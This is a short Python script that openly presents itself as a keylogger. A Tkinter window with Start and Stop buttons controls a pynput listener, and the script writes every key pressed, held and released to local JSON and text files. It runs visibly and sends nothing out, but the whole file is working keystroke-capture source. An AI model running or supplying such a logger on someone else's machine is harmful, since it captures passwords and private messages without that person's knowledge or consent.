from tkinter import CENTER as _CENTER
from tkinter import RIGHT as _RIGHT
from tkinter import LEFT as _LEFT
from tkinter import Tk as _Tk
from tkinter import Button as _Button
from tkinter import Label as _Label
from pynput import keyboard as _keyboard
import json as _JSON

keys_used: list = []
flag: bool = False
keys: str = ""


def generate_text_log(key) -> None:
    with open("./out/key_log.txt", "w+") as keys:
        keys.write(key)


def generate_json_file(keys_used) -> None:
    with open("./out/key_log.json", "+wb") as key_log:
        key_list_bytes = _JSON.dumps(keys_used).encode()
        key_log.write(key_list_bytes)


def on_press(key) -> None:
    global flag, keys_used, keys
    if flag == False:
        keys_used.append({"Pressed": f"{key}"})
        flag = True

    if flag == True:
        keys_used.append({"Held": f"{key}"})
    generate_json_file(keys_used)


def on_release(key) -> None:
    global flag, keys_used, keys
    keys_used.append({"Released": f"{key}"})

    if flag == True:
        flag = False
    generate_json_file(keys_used)

    keys = keys + str(key)
    generate_text_log(str(keys))


if __name__ == "__main__":

    def start_keylogger():
        global listener
        listener = _keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()
        label.config(
            text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'"
        )
        start_button.config(state="disabled")
        stop_button.config(state="normal")

    def stop_keylogger():
        global listener
        listener.stop()
        label.config(text="Keylogger stopped.")
        start_button.config(state="normal")
        stop_button.config(state="disabled")

    root = _Tk()
    root.title("Keylogger")

    label = _Label(root, text='Click "Start" to begin keylogging.')
    label.config(anchor=_CENTER)
    label.pack()

    start_button = _Button(root, text="Start", command=start_keylogger)
    start_button.pack(side=_LEFT)

    stop_button = _Button(root, text="Stop", command=stop_keylogger, state="disabled")
    stop_button.pack(side=_RIGHT)

    root.geometry("250x250")

    root.mainloop()
